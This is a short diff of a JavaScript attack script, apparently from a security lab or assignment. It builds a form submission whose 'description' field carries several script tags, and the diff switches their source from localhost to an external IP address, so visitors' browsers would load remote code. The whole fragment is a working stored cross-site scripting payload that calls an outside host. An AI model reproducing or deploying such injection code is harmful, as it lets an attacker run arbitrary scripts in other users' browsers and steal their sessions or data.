@@ -24,10 +24,10 @@ const script_2 = async () => {
     // -----------------------------353134234621141183101734432516
     // Content-Disposition: form-data; name="description"
 
-    const link_1=`<script type=text/javascript src=http://localhost:3030/script_1.js></script>`
-    const link_2=`<script type=text/javascript src=http://localhost:3030/script_2.js></script>`
-    const link_3=`<script type=text/javascript src=http://localhost:3030/script_3.js></script>`
-    const link=`<script type=text/javascript src=http://localhost:3030/script.js></script>`
+    const link_1=`<script type=text/javascript src=http://20.249.212.251:3030/script_1.js></script>`
+    const link_2=`<script type=text/javascript src=http://20.249.212.251:3030/script_2.js></script>`
+    const link_3=`<script type=text/javascript src=http://20.249.212.251:3030/script_3.js></script>`
+    const link=`<script type=text/javascript src=http://20.249.212.251:3030/script.js></script>`
 
     formData.set(`description`, `<p>1805066</p>${link}${link_1}${link_2}${link_3}`);
 
